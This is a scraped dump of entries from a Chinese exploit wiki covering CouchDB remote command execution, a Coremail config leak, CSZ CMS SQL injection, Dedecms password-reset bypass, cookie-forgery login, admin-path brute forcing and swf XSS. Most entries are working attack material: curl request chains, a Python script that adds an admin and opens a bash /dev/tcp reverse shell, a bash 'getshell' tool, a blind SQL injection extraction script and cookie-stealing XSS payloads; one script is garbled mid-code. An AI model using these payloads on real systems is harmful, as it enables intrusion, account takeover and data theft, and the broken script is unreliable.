window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CouchDB/1.html":{"url":"0day/CouchDB/1.html","title":"CouchDB未授权访问","keywords":"","body":"CouchDB未授权访问 一、漏洞简介 CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。 CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式： [query_servers] LANGUAGE = PATH ARGS 默认情况下，配置文件中已经设置了两个query_servers: [query_servers] javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js 可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 http://bobao.360.cn/learning/detail/4716.htmlhttps://justi.cz/security/2017/11/14/couchdb-rce-npm.html 二、影响范围 小于 1.7.0 以及 小于 2.1.1 该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。 三、复现过程 1.扫描探测 nmap -p 5984 --script \"couchdb-stats.nse\" 127.0.0.1 2.两个版本的利用方式 (1) 1.6.0 下的说明 依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。 curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '\"id >/tmp/success\"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type:application/json' 第一个请求是添加一个名字为cmd的query_servers，其值为 id >/tmp/success，这就是我们后面待执行的命令。 第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。 第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。 (2) 2.1.0 下的说明 2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。 Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可： curl http://vulhub:vulhub@your-ip:5984/_membership 可见，我们这里只有一个node，名字是nonode@nohost。 然后，我们修改nonode@nohost的配置： curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/success\"' 然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document： curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view： curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\" 增加_view的同时即触发了query_servers中的命令。 2.1 p牛的python脚本 支持高低版本 需要在version = 定义 ##!/usr/bin/env python3 import requests from requests.auth import HTTPBasicAuth target = 'http://127.0.0.1:5984' command = '\"bash -i >& /dev/tcp/192.168.2.64/2222 0>&1\"' version = 2 session = requests.session() session.headers = { 'Content-Type': 'application/json' } ## session.proxies = { ## 'http': 'http://127.0.0.1:8085' ## } session.put(target + '/_users/org.couchdb.user:wooyun', data='''{ \"type\": \"user\", \"name\": \"wooyun\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"wooyun\" }''') session.auth = HTTPBasicAuth('wooyun', 'wooyun') if version == 1: session.put(target + ('/_config/query_servers/cmd'), data=command) else: host = session.get(target + '/_membership').json()['all_nodes'][0] session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command) session.put(target + '/wooyun') session.put(target + '/wooyun/test', data='{\"_id\": \"wooyuntest\"}') if version == 1: session.post(target + '/wooyun/_temp_view?limit=10', data='{\"language\":\"cmd\",\"map\":\"\"}') else: session.put(target + '/wooyun/_design/test', data='{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}') 2.2 bash自动化脚本 ##!/bin/bash echo CouchDB getshell - c0debreak - tools.changesec.com echo if [[ $## -ne 2 ]];then echo Usage: $0 http://xx.xx.xx.xx:5984 myserver:myport exit 1 else server=$1 cb=${2/:/\\/} fi function run() { cmd=$1 curl -XPUT \"$server/_config/query_servers/cmd\" -d \"\\\"$cmd\\\"\" curl -XPUT \"$server/example\" curl -XPUT \"$server/example/record\" -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl --max-time 1 \"$server/example/_temp_view?limit=1\" -d '{\"language\":\"cmd\", \"map\":\"\"}' -H 'Content-Type: application/json' } run \"echo '/bin/bash -i >& /dev/tcp/$cb 0>&1' > /tmp/shell\" run \"bash /tmp/shell\" run \"rm -f /tmp/shell\" curl -XDELETE \"$server/_config/query_servers/cmd\" 漏洞修复 漏洞修复 1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 bind_address = 0.0.0.0，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。 2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini中找到 [admins]字段配置密码。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Coremail/1.html":{"url":"0day/Coremail/1.html","title":"Coremail配置文件信息泄漏","keywords":"","body":"一、漏洞简介 Coremail论客邮件系统开始研发于1999年，是中国第一套中文邮件系统，目前在中国大陆地区拥有超过10亿终端用户，是网易、中华网等运营商至今一直使用的邮件系统，也是政府、事业单位、科教、企业等机构广泛使用的邮件系统。 2019年6月，网上流传出Coremail论客邮件系统配置文件泄露的漏洞，该漏洞无需认证即可获取邮件系统的配置文件内容。 Coremail官网发布的漏洞公告：《关于Coremail邮件系统安全问题的情况说明》，http://www.coremail.cn/About/news_x/article_id/32641.htm 二、漏洞影响 Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞 三、复现过程 POC http://mail.xxxxx.com/mailsms/s?func=ADMIN:appState&dumpConfig=/ 输入Poc访问漏洞页面 发现信息泄露页面内搜索user，password，database等关键字 如下图 四、修复建议 1、在不影响使用的情况下，仅允许VPN连接后才可访问； 2、在Web服务器（nginx/apache）上限制外网对 /mailsms 路径的访问。建议使用Coremail构建邮件服务器的信息系统运营者立即自查，发现存在漏洞后及时修复。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-13 12:54:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Couchcms/CVE-2018-7662.html":{"url":"0day/Couchcms/CVE-2018-7662.html","title":"（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞","keywords":"","body":"（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞 一、漏洞简介 Couch through 2.0存在路径泄露漏洞，当访问特定url时系统返回的报错信息中暴露物理路径信息。Couch through是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过issues告知作者。 二、漏洞影响 Couch through 2.0 三、复现过程 poc 访问如下页面，报错信息中显示完整物理路径信息。 http://www.0-sec.org/includes/mysql2i/mysql2i.func.php http://www.0-sec.org/addons/phpmailer/phpmailer.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 01:11:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CSZ CMS/CVE-2019-13086.html":{"url":"0day/CSZ CMS/CVE-2019-13086.html","title":"（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞","keywords":"","body":"（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞 一、漏洞简介 CSZ CMS是一套基于PHP的开源内容管理系统（CMS）。 CSZ CMS 1.2.2版本（2019-06-20之前）中的core/MY_Security.php文件存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 CSZ CMS 1.2.2版本（2019-06-20之前） 三、复现过程 poc import requests import time import threading import multiprocessing pool=\"admin$ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+\" \"+\"bcefghjklopqrstuvwxyz1234567890/.\" mutex=0 #获取长度用的User-Agent模板 ual=\"'-(if((length((select name from user_admin limit 1))=10),sleep(5),1))-'', '127.0.0.1','time') #\" #\"Why don't you just build something\" #----------------------------------------------------获取管理员用户名长度-------------------------------------------- def getlength(field,tbname,total): ual_head=\"'-(if((length((select \" #这些空格一定要保留 ual_middle=\" limit 1))=\" num=1 ual_last=\"),sleep(5),1))-'', '127.0.0.1','time') #\" datas={'email':'111@111.com', 'password':'111' } header={'Host': 'localhost', 'Content-Length': '74', 'Cache-Control': 'max-age=0', 'Origin': 'http://localhost', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ual, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://localhost/cszcms/member/login', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Connection': 'close'} starttime=time.time() for num in range(total): header['User-Agent']=ual_head+field+\" from \"+tbname+ual_middle+str(num)+ual_last #print(header['User-Agent']) sendtime=time.time() response=requests.post(r\"http://localhost/cszcms/member/login/check/post\",data=datas,headers=header) recvtime=time.time() doesitwork=recvtime-sendtime if(doesitwork>5): print(\"The length is\",num) print(\"This step cost:\",time.time()-starttime) return num break if(num==total-1): return 0 #获取内容用的User-Agent模板 ua=\"'-(if((ascii(substr((select name from user_admin limit 1), 1, 1))=97),sleep(5),1))-'', '127.0.0.1','time') #\" #-----------------------------------------------------获取管理员用户名-------------------------------------------- def getcontent(field,tbname,num,qr,lock): #print(num) pool=\"@.tescomadin$ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+\" \"+\"bcefghjklpqrstuvwxyz1234567890/.\" result=[] ua_head=\"'-(if((ascii(substr((select \" ua_front=\" limit 1), \" ua_middle=\", 1))=\" char=\"A\" ua_last=\"),sleep(5),1))-'', '127.0.0.1','time') #\" datas={'email':'111@111.com', 'password':'111' } header={'Host': 'localhost', 'Content-Length': '74', 'Cache-Control': 'max-age=0', 'Origin': 'http://localhost', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://localhost/cszcms/member/login', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Connection': 'close'} for i in range(1): for char in pool: header['User-Agent']=ua_head+field+\" from \"+tbname+ua_front+str(num+1)+ua_middle+str(ord(char))+ua_last #print(header['User-Agent']) lock.acquire() sendtime=time.time() response=requests.post(r\"http://localhost/cszcms/member/login/check/post\",data=datas,headers=header) lock.release() recvtime=time.time() doesitwork=recvtime-sendtime if(doesitwork>5): #print(\"It cost:\",doesitwork) print(num,\" got:\",char) #adminnamelist[num]=char result=[num,char] qr.put(result) break #---------------------------------------------现在！让我们重新揭起救世的大旗！------------------------------------ if __name__=='__main__': qr=multiprocessing.Queue() lock=multiprocessing.Lock() field=\"password\" tbname=\"user_admin\" adminname=\"\" adminpwd=\"\" getresult=[] #调用获得长度的函数 length=getlength(field,tbname,100) print(\"length is\",length) processes=[] #开线程分别对每个字符匹配 timehead=time.time() for ti in range(length): processes.append(multiprocessing.Process(target=getcontent,args=(field,tbname,ti,qr,lock))) processes[ti].start() for ti in range(length): processes[ti].join() fout=open(field+\"out.txt\",\"w+\") for ci in range(length): getresult.append(qr.get()) print(getresult) for ci in range(length): for result in getresult: if(result[0]==ci): print(result[1]) adminname+=result[1] fout.write(adminname) print(field,\":\",adminname) fout.close() print(\"It took:\",time.time()-timehead) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-16 19:48:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/dede后台.html":{"url":"0day/Dedecms/dede后台.html","title":"Dedecms找后台","keywords":"","body":"Dedecms找后台 一、漏洞简介 仅针对windows系统 二、漏洞影响 三、复现过程 代码分析 进入正题 首先看核心文件common.inc.php 大概148行左右 if($_FILES) { require_once(DEDEINC.'/uploadsafe.inc.php'); } uploadsafe.inc.php if( preg_match('#^(cfg_|GLOBALS)#', $_key) ) { exit('Request var not allow for uploadsafe!'); } $$_key = $_FILES[$_key]['tmp_name']; //获取temp_name ${$_key.'_name'} = $_FILES[$_key]['name']; ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\\./]#i', '', $_FILES[$_key]['type']); ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']); if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) ) { if(!defined('DEDEADMIN')) { exit('Not Admin Upload filetype not allow !'); } } if(empty(${$_key.'_size'})) { ${$_key.'_size'} = @filesize($$_key); } $imtypes = array ( \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \"image/xpng\", \"image/wbmp\", \"image/bmp\" ); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。 if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } } ...... 注意$$key这一句，变量$key取自于$_FILE，由于$_FILE可控自然$key也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现cfg|GLOBALS。(但是应该还可以覆盖其他变量此处感觉还可以深挖) 本人出发点是找个可以利用 但在这之前有个if(!defined('DEDEADMIN'))的判断,这个很好绕过设置tmp_name为0或者1.jpg含. 就可以绕过。 最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。 当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow ! 举个例子 get: http://localhost/test.php?poc=./d复现 构造poc http://0-sec.org/tags.php post: dopost=save&_FILES[b4dboy][tmp_name]=./deCommon.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例 当目录存在点时候 当目录不存在点时候 python脚本 ![image](./img/25.png) #!/usr/bin/env python #coding:utf-8 import requests import itertools from random import choice import sys characters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-\" back_dir = \"\" show_message = {} check_message = {} valid_file = [] data = { \"_FILES[tools][tmp_name]\" : \"./../{p}\"+res.text if \"Upload filetype not allow !\" in res.text and res.status_code == 200: valid_file.append(filename) except: pass #print valid_file #print valid_file if len(valid_file): if \"/tags.php\" in valid_file: for i in valid_file: if i == \"/tags.php\": return i else: file_name = choice(valid_file) return file_name else: return False def Bute(self): f_name = self.Check() #print f_name if f_name != False: if f_name == \"/tags.php\": prefix = \"./\" else: prefix = \"./../\" flag = 0 global characters,back_dir,data,check_message for num in range(1,7): if flag: break for pre in itertools.permutations(characters,num): pre = ''.join(list(pre)) data[\"_FILES[tools][tmp_name]\"] = data[\"_FILES[tools][tmp_name]\"].format(p=pre) print(\"testing\",pre) r = requests.post(self.target+f_name,data=data) if \"Upload filetype not allow !\" not in r.text and r.status_code == 200: flag = 1 back_dir = pre data[\"_FILES[tools][tmp_name]\"] = \"%s{p}零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 21:38:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/swfxss.html":{"url":"0day/Dedecms/swfxss.html","title":"swf文件反射型xss","keywords":"","body":"Dedecms swf文件反射型xss 一、漏洞简介 DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。 二、漏洞影响 三、复现过程 代码分析 详细说明： Location: /uploads/images/swfupload/swfupload.swf 漏洞文件为：http://www.dedecms.com/images/swfupload/swfupload.swf 这个flash文件存在漏洞，此文件漏洞可参考:https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/ 复现 /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22ian最帅%22%29}}// /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}// 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 21:42:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/会员SSV-97074.html":{"url":"0day/Dedecms/会员SSV-97074.html","title":"【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改","keywords":"","body":"（SSV-97074）DeDecms 前台任意用户密码修改 一、漏洞简介 无CVE， SSV-97074，提交时间：20180110 在用户密码重置功能处，php存在弱类型比较，导致如果用户没有设置密保问题的情况下可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是member表中的密码，即使修改了管理员密码也是member表中的管理员密码，仍是无法进入管理 二、漏洞影响 三、复现过程 代码分析 php弱类型比较问题很常见，在不同类型比较时，如果使用的是==，php会将其中一个数据进行强制转换为另一个，比如’123a’就会被强制转换成123。这样就出现了弱类型比较问题，当然如果使用===判断比较就不会出现问题了。常见比较如下 '' == 0 == false '123' == 123 //'123'强制转换为123 'abc' == 0　 //intval('abc')==0 '123a' == 123 //intval('123a')==123 '0x01' == 1 //被识别为十六进制 '0e123456789' == '0e987654321'　　//被识别为科学计数法 [false] == [0] == [NULL] == [''] NULL == false == 0 true == 1 dedecms的/member/resetpassword.php就是用来处理用户密码重置的问题，问题出在75行开始处理验证密保问题处。 else if($dopost == \"safequestion\") { $mid = preg_replace(\"#[^0-9]#\", \"\", $id); $sql = \"SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'\"; $row = $db->GetOne($sql); if(empty($safequestion)) $safequestion = ''; if(empty($safeanswer)) $safeanswer = ''; if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) { sn($mid, $row['userid'], $row['email'], 'N'); exit(); } else { ShowMsg(\"对不起，您的安全问题或答案回答错误\",\"-1\"); exit(); } } 可以看到，这段代码先是从数据库取出相关用户的密保问题及密保答案，在对用户输入做了一些处理后，进行了关键性的判断if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) ，就在这里用了弱类型判断==。 首先我们知道，如果没有设置密保的话safequestion从数据库取出默认为’0’，safeanswer为空。根据empty函数特性，’0’会被判断为空，会进入重新将$safequestion赋值为’’。而'0' != '' ，所以我们需要一个输入即不使empty为空，且弱类型等于’0’的字符串。'00'、'000'、'0.0'以上这些都是可以的。 接下来safeanswer既然本来就为空，那么不输入正好也就相等了。跟踪sn函数 function sn($mid,$userid,$mailto, $send = 'Y') { global $db; $tptim= (60*10); $dtime = time(); $sql = \"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'\"; $row = $db->GetOne($sql); if(!is_array($row)) { //发送新邮件； newmail($mid,$userid,$mailto,'INSERT',$send); } //10分钟后可以再次发送新验证码； elseif($dtime - $tptim > $row['mailtime']) { newmail($mid,$userid,$mailto,'UPDATE',$send); } //重新发送新的验证码确认邮件； else { return ShowMsg('对不起，请10分钟后再重新申请', 'login.php'); } } 跟踪newmail function newmail($mid, $userid, $mailto, $type, $send) { global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl; $mailtime = time(); $randval = random(8); $mailtitle = $cfg_webname.\":密码修改\"; $mailto = $mailto; $headers = \"From: \".$cfg_adminemail.\"\\r\\nReply-To: $cfg_adminemail\"; $mailbody = \"亲爱的\".$userid.\"：\\r\\n您好！感谢您使用\".$cfg_webname.\"网。\\r\\n\".$cfg_webname.\"应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\\r\\n本次临时登陆密码为：\".$randval.\" 请于三天内登陆下面网址确认修改。\\r\\n\".$cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&id=\".$mid; if($type == 'INSERT') { $key = md5($randval); $sql = \"INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid', '$key', '$mailtime');\"; if($db->ExecuteNoneQuery($sql)) { if($send == 'Y') { sendmail($mailto,$mailtitle,$mailbody,$headers); return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000'); } else if ($send == 'N') { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&amp;id=\".$mid.\"&amp;key=\".$randval); } } else { return ShowMsg('对不起修改失败，请联系管理员', 'login.php'); } } 可见在sn函数中将send参数设置了’N’，其实就是生成了暂时密码并插入了数据库中，并进行跳转： else if ($send == 'N') { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&amp;id=\".$mid.\"&amp;key=\".$randval); } 复现 在找回密码处，点击通过安全问题取回。 填写信息并抓包，修改id和userid为想要重置密码的对象，再加上以上分析内容，发包即可得到修改密码url 进入该url，修改密码。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 21:30:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/会员SSV-97087.html":{"url":"0day/Dedecms/会员SSV-97087.html","title":"【开启会员注册】（SSV-97087）DeDecms 任意用户登录","keywords":"","body":"（SSV-97087）DeDecms 任意用户登录 一、漏洞简介 漏洞编号：SSV-97087，提交时间：20180118 dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。 二、漏洞影响 三、复现过程 代码分析 在/member/index.php中会接收uid和action参数。uid为用户名，进入index.php后会验证Cookie中的用户ID与uid(用户名)并确定用户权限。 if($action == '') { include_once(DEDEINC.\"/channelunit.func.php\"); $dpl = new DedeTemplate(); $tplfile = DEDEMEMBER.\"/space/{$_vars['spacestyle']}/index.htm\"; //更新最近访客记录及站点统计记录 $vtime = time(); $last_vtime = GetCookie('last_vtime'); $last_vid = GetCookie('last_vid'); if(empty($last_vtime)) { $last_vtime = 0; } if($vtime - $last_vtime > 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.',')) { if($last_vid!='') { $last_vids = explode(',',$last_vid); $i = 0; $last_vid = $uid; foreach($last_vids as $lsid) { if($i>10) { break; } else if($lsid != $uid) { $i++; $last_vid .= ','.$last_vid; } } } else { $last_vid = $uid; } PutCookie('last_vtime', $vtime, 3600*24, '/'); PutCookie('last_vid', $last_vid, 3600*24, '/'); 我们可以看到当uid存在值时就会进入我们现在的代码中，当cookie中的last_vid中不存在值为空时，就会将uid值赋予过去，$last_vid = $uid;，然后PutCookie。 那么这么说，我们控制了$uid就相当于可以返回任意值经过服务器处理的md5值。 而在接下来会验证用户是否登录。 现在我们来看看，dedecms会员认证系统是怎么实现的：/include/memberlogin.class.php //php5构造函数 function __construct($kptime = -1, $cache=FALSE) { global $dsql; if($kptime==-1){ $this->M_KeepTime = 3600 * 24 * 7; }else{ $this->M_KeepTime = $kptime; } $formcache = FALSE; $this->M_ID = $this->GetNum(GetCookie(\"DedeUserID\")); $this->M_LoginTime = GetCookie(\"DedeLoginTime\"); $this->fields = array(); $this->isAdmin = FALSE; if(empty($this->M_ID)) { $this->ResetUser(); }else{ $this->M_ID = intval($this->M_ID); if ($cache) { $this->fields = GetCache($this->memberCache, $this->M_ID); if( empty($this->fields) ) { $this->fields = $dsql->GetOne(\"Select * From `#@__member` where mid='{$this->M_ID}' \"); } else { $formcache = TRUE; } } else { $this->fields = $dsql->GetOne(\"Select * From `#@__member` where mid='{$this->M_ID}' \"); } if(is_array($this->fields)){ #api{{ if(defined('UC_API') && @include_once DEDEROOT.'/uc_client/client.php') { if($data = uc_get_user($this->fields['userid'])) { if(uc_check_avatar($data[0]) && !strstr($this->fields['face'],UC_API)) { $this->fields['face'] = UC_API.'/avatar.php?uid='.$data[0].'&size=middle'; $dsql->ExecuteNoneQuery(\"UPDATE `#@__member` SET `face`='\".$this->fields['face'].\"' WHERE `mid`='{$this->M_ID}'\"); } } } #/aip}} //间隔一小时更新一次用户登录时间 if(time() - $this->M_LoginTime > 3600) { $dsql->ExecuteNoneQuery(\"update `#@__member` set logintime='\".time().\"',loginip='\".GetIP().\"' where mid='\".$this->fields['mid'].\"';\"); PutCookie(\"DedeLoginTime\",time(),$this->M_KeepTime); } $this->M_LoginID = $this->fields['userid']; $this->M_MbType = $this->fields['mtype']; $this->M_Money = $this->fields['money']; $this->M_UserName = FormatUsername($this->fields['uname']); $this->M_Scores = $this->fields['scores']; $this->M_Face = $this->fields['face']; $this->M_Rank = $this->fields['rank']; $this->M_Spacesta = $this->fields['spacesta']; $sql = \"Select titles From #@__scores where integralfields['scores']} order by integral desc\"; $scrow = $dsql->GetOne($sql); $this->fields['honor'] = $scrow['titles']; $this->M_Honor = $this->fields['honor']; if($this->fields['matt']==10) $this->isAdmin = TRUE; $this->M_UpTime = $this->fields['uptime']; $this->M_ExpTime = $this->fields['exptime']; $this->M_JoinTime = MyDate('Y-m-d',$this->fields['jointime']); if($this->M_Rank>10 && $this->M_UpTime>0){ $this->M_HasDay = $this->Judgemember(); } if( !$formcache ) { SetCache($this->memberCache, $this->M_ID, $this->fields, 1800); } }else{ $this->ResetUser(); } } } $this->M_ID等于Cookie中的DedUserID，我们继续看看GetCookie函数 if ( ! function_exists('GetCookie')) { function GetCookie($key) { global $cfg_cookie_encode; if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) ) { return ''; } else { if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16)) { return ''; } else { return $_COOKIE[$key]; } } } } 它不但读了cookie还验证了md5值。 这样，由于index.php中我们可以控制返回一个输入值和这个输入值经过服务器处理后的md5值。那么如果我们伪造DedUserID和它对应的MD5就行了。 最后一个问题，因为我们上面是通过用户名伪造ID的，用户名为字符串而ID为整数，但好在在构造用户类中将M_ID intval了一下$this->M_ID = intval($this->M_ID); 那么这么说，如果我们想伪造ID为1的用户的Md5，我们只要在上面设置uid(用户名)为’000001’即可。 复现 1、先从member/index.php中获取伪造的DedeUserID和它对于的md5 2、使用它登录 访问member/index.php?uid=0000001并抓包(注意cookie中last_vid值应该为空)。 可以看到已经获取到了，拿去当做DeDeUserID 可以看到，登陆了admin用户。 python脚本 # coding=utf-8 import requests import re if __name__ == \"__main__\": dede_host = \"http://127.0.0.1/\" oldpwd = '123456' newpwd = \"cnvdcnvd\" s = requests.Session() if '系统关闭了会员功能' in requests.get(dede_host + 'member/reg_new.php').content: exit('The system has closed the member function .Can not attack !!!') else: print \"The system opened the membership function, I wish you good luck !!\" headers = {\"Referer\": dede_host + \"member/reg_new.php\"} rs = s.get(dede_host + 'include/vdimgck.php').content file = open('1.jpg', \"wb\") file.write(rs) file.close() vdcode = raw_input(\"Please enter the registration verification code : \") userid = '0000001' uname = '0000001' userpwd = '123456' headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0)\", \"Content-Type\": \"application/x-www-form-urlencoded\"} data = \"dopost=regbase&step=1&mtype=%E4%B8%AA%E4%BA%BA&mtype=%E4%B8%AA%E4%BA%BA&userid={userid}&uname={uname}&userpwd={userpwd}&userpwdok={userpwd}&email=0000001%400000001.com&safequestion=0&safeanswer=&sex=%E7%94%B7&vdcode={vdcode}&agree=\".format( userid=userid, uname=uname, userpwd=userpwd, vdcode=vdcode) rs = s.post(dede_host + '/member/reg_new.php', data=data, headers=headers) if \"验证码错误\" in rs.content: exit(\"Verification code error, account registration failed\") elif '注册成功' in rs.content: print 'registration success !!' rs = s.get(dede_host + \"/member/index.php?uid={userid}\".format(userid=userid)) if \"资料尚未通过审核\" in rs.content: exit(\"User information has not been approved !!!\") # 会员使用权限开通状态(-10 邮件验证 -1 手工审核, 0 没限制)： searchObj = re.search(r'last_vid__ckMd5=(.*?);', rs.headers['Set-Cookie'], re.M | re.I) last_vid__ckMd5 = searchObj.group(1) s.cookies['DedeUserID'] = userid s.cookies['DedeUserID__ckMd5'] = last_vid__ckMd5 rs = 